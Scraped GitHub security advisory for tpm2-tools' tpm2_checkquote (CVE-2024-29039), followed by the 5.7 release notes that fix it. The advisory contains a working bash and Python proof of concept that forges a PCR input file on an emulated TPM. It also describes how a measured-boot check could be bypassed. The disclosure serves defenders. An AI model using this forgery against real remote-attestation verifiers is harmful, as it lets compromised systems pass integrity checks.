=== Content from github.com_15419a46_20250110_183558.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftpm2-software%2Ftpm2-tools%2Fsecurity%2Fadvisories%2FGHSA-8rjm-5f5f-h4q6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftpm2-software%2Ftpm2-tools%2Fsecurity%2Fadvisories%2FGHSA-8rjm-5f5f-h4q6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=tpm2-software%2Ftpm2-tools)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[tpm2-software](/tpm2-software)
/
**[tpm2-tools](/tpm2-software/tpm2-tools)**
Public

* [Notifications](/login?return_to=%2Ftpm2-software%2Ftpm2-tools) You must be signed in to change notification settings
* [Fork
  381](/login?return_to=%2Ftpm2-software%2Ftpm2-tools)
* [Star
   735](/login?return_to=%2Ftpm2-software%2Ftpm2-tools)

* [Code](/tpm2-software/tpm2-tools)
* [Issues
  313](/tpm2-software/tpm2-tools/issues)
* [Pull requests
  7](/tpm2-software/tpm2-tools/pulls)
* [Actions](/tpm2-software/tpm2-tools/actions)
* [Projects
  0](/tpm2-software/tpm2-tools/projects)
* [Security](/tpm2-software/tpm2-tools/security)
* [Insights](/tpm2-software/tpm2-tools/pulse)

Additional navigation options

* [Code](/tpm2-software/tpm2-tools)
* [Issues](/tpm2-software/tpm2-tools/issues)
* [Pull requests](/tpm2-software/tpm2-tools/pulls)
* [Actions](/tpm2-software/tpm2-tools/actions)
* [Projects](/tpm2-software/tpm2-tools/projects)
* [Security](/tpm2-software/tpm2-tools/security)
* [Insights](/tpm2-software/tpm2-tools/pulse)

# Missing check in tpm2\_checkquote allows attackers to misrepresent the TPM state

Critical

[AndreasFuchsTPM](/AndreasFuchsTPM)
published
GHSA-8rjm-5f5f-h4q6
Jun 25, 2024

## Package

tpm2\_checkquote

## Affected versions

<=5.6

## Patched versions

>= 5.5.1 >=5.6.1 >=5.7

## Description

# Vulnerability Report

## Summary

This vulnerability allows attackers to manipulate tpm2\_checkquote outputs by altering the TPML\_PCR\_SELECTION in the PCR input file. As a result, digest values are incorrectly mapped to PCR slots and banks, providing a misleading picture of the TPM state.

The vulnerability is relatively easy to exploit but is less catastrophic than GHSA-4xvm-4rqh-r79g. I would still consider it a critical vulnerability since it results in a confusion regarding the TPM state of the attested system.

## Product

tpm2\_checkquote

## Impacted Version

Vulnerability was confirmed on 5.4

It likely impacts all versions of the tool

## Details

### Background

A TPM2 quote contains attested data, its integrity comes from the signature produced by the TPM. The attested data is in the following format (TPMS\_QUOTE\_INFO struct) :

| Parameter | Type | Description |
| --- | --- | --- |
| pcrSelect | TPML\_PCR\_SELECTION | information on algID, PCR selected and digest |
| pcrDigest | TPM2B\_DIGEST | digest of the selected PCR using the hash of the signing key |

Per Trusted Platform Module Library Specification, Family “2.0”, Level 00, Revision 01.59 – November 2019. Part 2: Structures.

The PCR input file must be treated as untrusted data (its content is not signed). It is a hint to interpret the quote. This file is needed to provide the PCR values which are not included in the quote (only a composite digest is included in the quote).

It has the following format:

* pcrSelect TPML\_PCR\_SELECTION
* count UINT32 (number of digests that follows)
* digests ARRAY OF TPML\_DIGEST

Since the PCR input file is untrusted data, it should be validated. Unfortunately the checkquote tool stops halfway.

The tool indeed check that the pcrDigest from the quote (in the TPMS\_QUOTE\_INFO) matches the digest of the concatenation of all relevant PCRs from the PCR input file. However it does not check that the PCR selection of the PCR input file matches with the one included in the quote. Because of that an attacker can craft PCR input files with any TPML\_PCR\_SELECTION he wants, as long as the concatenation of the digests that results still matches the pcrDigest in the quote.

Thus an attacker can swap a compatible selection for another, which result in TPM register values being associated with the wrong PCR index or bank.

Take for example the case where a quote is generated to attest to the PCR selection sha256:0,1,2. An attacker can craft a PCR input file which, upon being checked with tpm2\_checkquote, passes verification. The output will falsely indicate that the selection sha256:7,8,9 contains the digests BANK[SHA256].PCR[0], BANK[SHA256].PCR[1], and BANK[SHA256].PCR[2].

This vulnerability also extends to the reinterpretation of data across PCR banks (and their corresponding hashing algorithms), provided the total lengths are the same. As a result, the digests may be incorrectly associated not just with the wrong PCR index but also with inaccurate values due to the reinterpretation (casting) of bytes from a different bank, where the digest sizes may vary. For example, 8 digests from a SHA1 bank could be misrepresented as 5 digests from a SHA256 bank, as both selections encompass a total of 160 bytes.

## Proof of Concept

### Requirements

The following PoC has been tested on a Debian 12 (bookworm), but any debian-based OS (Ubuntu) should work with no modification.

Install the required dependencies with :

```
sudo apt-get install -y tpm2-tools swtpm-tools xxd python3
```
## The PoC

The PoC is provided as a bash script

```
#!/bin/bash

set -euo pipefail

## Step 1 : Create and initialize a TPM emulator

# Kill previously launched tpm emulator if needed

killall swtpm 2>/dev/null || true

# Create a temporary folder
rm -rf /tmp/tpmstate
mkdir /tmp/tpmstate

sudo swtpm_setup \
    --tpm2 \
    --tpmstate /tmp/tpmstate \
    --create-ek-cert \
    --create-platform-cert \
    --pcr-banks sha1,sha256 \
    > /dev/null

# Might not be needed if you're running as root
sudo chown --recursive "$(whoami)" /tmp/tpmstate

swtpm socket \
    --tpm2 \
    --tpmstate dir=/tmp/tpmstate \
    --ctrl type=tcp,port=2322 \
    --server type=tcp,port=2321 \
    --flags not-need-init \
    -d

# Instruct tpm2's tools to use the simulator and not your HW TPM
export TPM2TOOLS_TCTI="swtpm:port=2321"
tpm2 startup -c

tpm2 createek -G rsa -c ek.handle -u ek.pub
tpm2 createak -C ek.handle -c ak.ctx -u ak.pub -n ak.name -G rsa -g sha256 -f pem

echo "TPM emulator set up"

# Initially PCR[0], PCR[1]... PCR[3], PCR[7]...PCR[9] are set to 00s
# in order to demonstrate the vulnerability we measure
# different events in each PCR, so that the PCR values differs.
echo "pcr0" > pcr0.data
echo "pcr1" > pcr1.data
echo "pcr2" > pcr2.data
tpm2_pcrevent 0 pcr0.data >/dev/null
tpm2_pcrevent 1 pcr1.data >/dev/null
tpm2_pcrevent 2 pcr2.data >/dev/null

echo "Ground truth of the TPM state (tpm2_pcrread)"

tpm2_pcrread sha256:0,1,2,7,8,9 --pcrs_format serialized

## Step 2 : Generate a quote that attest to the PCR selection sha256:0,1,2
# (simulate the trustworthy server)
tpm2 flushcontext -t
tpm2_quote -Q -c ak.ctx \
    -l sha256:0,1,2 \
    --message msg.dat \
    --signature sign.dat \
    --pcr pcr.dat
echo "Quote generated with selection sha256:0,1,2"

## Step 3 : Replace the TPML_PCR_SELECTION structure of pcr.dat
# with a pcr selection of our choosing. Here we chose to replace the
# quote PCR selection (sha256:0,1,2) with sha256:7,8,9

# For simplicity, we use tpm2_pcrread to generate a TPML_PCR_SELECTION
# Note that this step can be run on any machine (or simulated TPM)
# The digests of tmppcr.dat will be unused.
tpm2_pcrread sha256:7,8,9 --pcrs_format serialized -o tmppcr.dat \
    > /dev/null

# The PCR input file starts with a TPML_PCR_SELECTION followed by the digests.
# The TPML_PCR_SELECTION structure size is 132 bytes.
# We take the TPML_PCR_SELECTION of tmppcr.dat
# and the digests of refpcr.dat to build bad.pcr.dat
python3 - <<EOF
from pathlib import Path

ref_pcr = Path("pcr.dat").read_bytes()
tmp_pcr = Path("tmppcr.dat").read_bytes()
forgery = bytearray(ref_pcr)
forgery[0:132]=tmp_pcr[0:132]
Path("bad.pcr.dat").write_bytes(forgery)
EOF

echo "Replaced the PCR selection with sha256:7,8,9"

## Step 4 : We run tpm2_checkquote and observe what happens

echo "tpm2 checkquote output : "
tpm2_checkquote \
    --public ak.pub \
    --message msg.dat \
    --signature sign.dat \
    --pcr bad.pcr.dat

echo "tpm2_checkquote exit code: $?"

tpm2 --version
```

Expected output :

```
loaded-key:
  name: 000bbb9145e0a6d44470d0ac729620189a880d8d0553ffbfb4d9ff0f70d91c36c5b6
  qualified name: 000b5ed336bf6c94bf9513d754225ca3c73853a29ee715b186b9df48093cf15bf4bb
TPM emulator set up
Ground truth of the TPM state (tpm2_pcrread)
  sha256:
    0 : 0x625F4E4BB00C6DF5797C9C76B4F16138997B81D6E49FD0A8D2079833F8817C0A
    1 : 0xA31DBD617EDB97FEECBD149E60548BEE0C80532CBECF64B01368ADB2E890E3F7
    2 : 0x56B9BDFA2696F745D6E605649EAA31577A896CD10F1267EFCA659FFACDEFCFEA
    7 : 0x0000000000000000000000000000000000000000000000000000000000000000
    8 : 0x0000000000000000000000000000000000000000000000000000000000000000
    9 : 0x0000000000000000000000000000000000000000000000000000000000000000
Quote generated with selection sha256:0,1,2
Replaced the PCR selection with sha256:7,8,9
tpm2 checkquote output :
pcrs:
  sha256:
    7 : 0x625F4E4BB00C6DF5797C9C76B4F16138997B81D6E49FD0A8D2079833F8817C0A
    8 : 0xA31DBD617EDB97FEECBD149E60548BEE0C80532CBECF64B01368ADB2E890E3F7
    9 : 0x56B9BDFA2696F745D6E605649EAA31577A896CD10F1267EFCA659FFACDEFCFEA
sig: d901a70f2837b7f5a280dda252aadbc7ab6ee253dea85e5149723800af51a244ec41c4c8b61a3950f4cb2932439b6a768953ddea8907fd870ee4131b1276ec30ffc018eef34bae02e0192d047523a8332660fabe7f4d7acec71921af46dbc4607ccc96d0528b735a9cc91ffa11cd5ba802c6d6775b8f778538837e8269814f313ba688f9ff554649fb941c8cfef94cfe76e07e7bfa04d1759ce4fb56cc367b8503439fc5914c0c6e18125339e6afed86f2f90407e3d34ca0db0464784b1b95251eabac09ff7d9cacb783bcc3f09424b739268f791b8374f98b6557cf959623b2c20ff201da1cce3f4f932f5a3e3825e4d33fd9d552e0fa5b09af7fa230b90986
tpm2_checkquote exit code: 0
tool="tpm2" version="5.4" tctis="libtss2-tctildr" tcti-default=tcti-device

```
## Impact

Any user relying on tpm2-tools checkquote utility is likely impacted by this vulnerability. Since the role of the quote is to attest to the current state of the TPM, having a wrong view of the TPM state is very risky.

Each PCR slot is used for a specific purpose. For instance on Linux PCR[0] will measure the "Core system firmware executable code", while PCR[4] will measure "Boot loader and additional drivers; binaries and extensions loaded by the boot loader". And while at first glance, it might seem that altering the mapping will result in an invalid TPM state that would be rejected by the verifier (because it does not match with the expected PCR values). This vulnerability can actually compromise most use of remote attestation. Below I give an example for how the security of measured boot could be circumvented by an attacker exploiting this vulnerability.

### Measured boot

In a measured boot setting the verifier wants to make sure the system booted on the right OS. Conversely, the goal of the attacker is to boot on a compromised OS while still passing all the verifier checks.

Let's say that some PCR are checked against golden values by the verifier. For instance let's say that they are checking against:

Golden TPM state:

| PCR index | Digest |
| --- | --- |
| 0 | golden\_pcr[0] |
| 1 | golden\_pcr[1] |
| 2 | golden\_pcr[2] |
| 3 | golden\_pcr[3] |
| 4 | golden\_pcr[4] |

The attacker boots on a the wrong Portable Executable image (in practice this will be the image of an OS he can control).

At that time, the victim device TPM state is as follows:

| PCR index | Digest |
| --- | --- |
| 0 | golden\_pcr[0] |
| 1 | golden\_pcr[1] |
| 2 | golden\_pcr[2] |
| 3 | golden\_pcr[3] |
| 4 | bad digest |
| ... |  |
| 15 | 00s |

Currently the TPM state have good values for PCR[0]... PCR[3], but a bad digest in PCR[4]. So the verifier will detect that the system has been tampered with.

The attacker wants to avoid that, so he finds a PCR index whose value is still in its initial state (sequence of 00s). Let's say he uses PCR[15]. Then he "simulates" the TPM\_Extend operation that the boot process would have normally produced when measuring the good Portable Executable but he extends PCR[15] instead of PCR[4].

Now, the victim device TPM state is as follows:

| PCR index | Digest |
| --- | --- |
| 0 | golden\_pcr[0] |
| 1 | golden\_pcr[1] |
| 2 | golden\_pcr[2] |
| 3 | golden\_pcr[3] |
| 4 | bad digest |
| ... |  |
| 15 | golden\_pcr[4] |

Finally the attacker request a quote for pcr slots 0,1,2,3,15 and uses the present vulnerability to present it as a quote that attest to pcr slots 0,1,2,3,4, and the golden digests. The verifier which uses tpm2\_checkquote will accept the quote as it seems it matches the golden measurements.

### Mitigating circumstance

The vulnerability impact might be partially mitigated by the fact that the attacker will likely need to be able to replace the value of PCR with another (ability to use TPM\_Extend). So this attack requires some kind of local or privileged access on the targeted system.

## Remediation

The tpm2\_checkquote.c file needs to be corrected to ensure that the TPML\_PCR\_SELECTION in the quote is identitical to the TPML\_PCR\_SELECTION from the PCR input file.

## Contact

Corentin Lauverjat (corentin.lauverjat@mithrilsecurity.io) from Mithril Security

## Disclosure Policy

Our security team firmly believes in the value of full disclosure to ensure transparency and prompt remediation of vulnerabilities. This is because we design systems in which we are ourselves part of the threat model. However, we understand the industry's preference for coordinated disclosure.

If the project team responds and agrees the issue poses a security risk, we will work with the project security team or maintainers to communicate the vulnerability in detail, and agree on the process for public disclosure. Responsibility for developing and releasing a patch lies firmly with the project team, though we aim to facilitate this by providing detailed information about the vulnerability.

Our disclosure deadline for publicly disclosing a vulnerability is: 60 days after the first report to the project team.

We appreciate the work maintainers put into fixing vulnerabilities and understand that sometimes more time is required to properly address an issue. We want project maintainers to succeed and because of that we are always open to discuss our disclosure policy to fit your specific requirements, when warranted.

### Severity

Critical

### CVE ID

CVE-2024-29039

### Weaknesses

[CWE-807](/advisories?query=cwe%3A807)

### Credits

* [![@clauverjat](https://avatars.githubusercontent.com/u/29842852?s=40&v=4)](/clauverjat)
  [clauverjat](/clauverjat)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_bc89d6d3_20250110_183558.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftpm2-software%2Ftpm2-tools%2Freleases%2Ftag%2F5.7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftpm2-software%2Ftpm2-tools%2Freleases%2Ftag%2F5.7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=tpm2-software%2Ftpm2-tools)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[tpm2-software](/tpm2-software)
/
**[tpm2-tools](/tpm2-software/tpm2-tools)**
Public

* [Notifications](/login?return_to=%2Ftpm2-software%2Ftpm2-tools) You must be signed in to change notification settings
* [Fork
  381](/login?return_to=%2Ftpm2-software%2Ftpm2-tools)
* [Star
   735](/login?return_to=%2Ftpm2-software%2Ftpm2-tools)

* [Code](/tpm2-software/tpm2-tools/tree/5.7)
* [Issues
  313](/tpm2-software/tpm2-tools/issues)
* [Pull requests
  7](/tpm2-software/tpm2-tools/pulls)
* [Actions](/tpm2-software/tpm2-tools/actions)
* [Projects
  0](/tpm2-software/tpm2-tools/projects)
* [Security](/tpm2-software/tpm2-tools/security)
* [Insights](/tpm2-software/tpm2-tools/pulse)

Additional navigation options

* [Code](/tpm2-software/tpm2-tools/tree/5.7)
* [Issues](/tpm2-software/tpm2-tools/issues)
* [Pull requests](/tpm2-software/tpm2-tools/pulls)
* [Actions](/tpm2-software/tpm2-tools/actions)
* [Projects](/tpm2-software/tpm2-tools/projects)
* [Security](/tpm2-software/tpm2-tools/security)
* [Insights](/tpm2-software/tpm2-tools/pulse)

1. [Releases](/tpm2-software/tpm2-tools/releases)
2. [5.7](/tpm2-software/tpm2-tools/releases/tag/5.7)

# 5.7

[Latest](/tpm2-software/tpm2-tools/releases/latest)

[Latest](/tpm2-software/tpm2-tools/releases/latest)

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/tpm2-software/tpm2-tools/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...5.7)

 Loading

[View all tags](/tpm2-software/tpm2-tools/tags)

![@AndreasFuchsTPM](https://avatars.githubusercontent.com/u/5175109?s=40&v=4)
[AndreasFuchsTPM](/AndreasFuchsTPM)
released this
26 Apr 11:34

·
[23 commits](/tpm2-software/tpm2-tools/compare/5.7...master)
to master
since this release

[5.7](/tpm2-software/tpm2-tools/tree/5.7)

This tag was signed with the committer’s **verified signature**.

[![](https://avatars.githubusercontent.com/u/5175109?s=64&v=4)](/AndreasFuchsTPM)
[AndreasFuchsTPM](/AndreasFuchsTPM)
Andreas Fuchs

GPG key ID: 8F4F9A45D7FFEE74

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

[`c6e182c`](/tpm2-software/tpm2-tools/commit/c6e182cf690ca0022b77fe7d3c174659917a7e7e)

### Security

* Fixed CVE-2024-29038
* Fixed CVE-2024-29039

### Fixed

* Fix eventlog test
* Fix issues with reading NV indexes
* Fix context save error on tpm2\_create
* tpm2\_sessionconfig: fix handling of `--disable-continue session` so that the subsequent command will not fail

  when attempting to context save a flushed session.
* detection of functions within libcrypto when CRYPTO\_LIBS is set and system has install libcrypto.
* tpm2\_send: fix EOF detection on input stream.
* tpm2\_policy.c fix compilation error caused by format directive for size\_t on 32 bit systems.
* tpm2\_nvread: fix input handling no nv index.
* Auth file: Ensure 0-termination when reading auths from a file.
* configure.ac: fix bashisms. configure scripts need to be runnable with a POSIX-compliant /bin/sh.
* cirrus.yml fix tss compilation with libtpms for FreeBSD.
* tpm2\_tool.c Fix missing include for basename to enable compilation on netbsd.
* options: fix TCTI handling to avoid failures for commands that should work with no options.
* tpm2\_getekcertificate.c Fix leak. ek\_uri was not freed if get\_ek\_server\_address failed.

### Added

* Add the possibility for autoflush (environment variable "TPM2TOOLS\_AUTOFLUSH", or -R option)

### Removed

* Testing on Ubuntu 18.04 as it's near EOL (May 2023).m2\_policy.c fix compilation error caused by format directive for size\_t on 32 bit systems.
* tpm2\_nvread: fix input handling no nv index.

 Assets
4

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


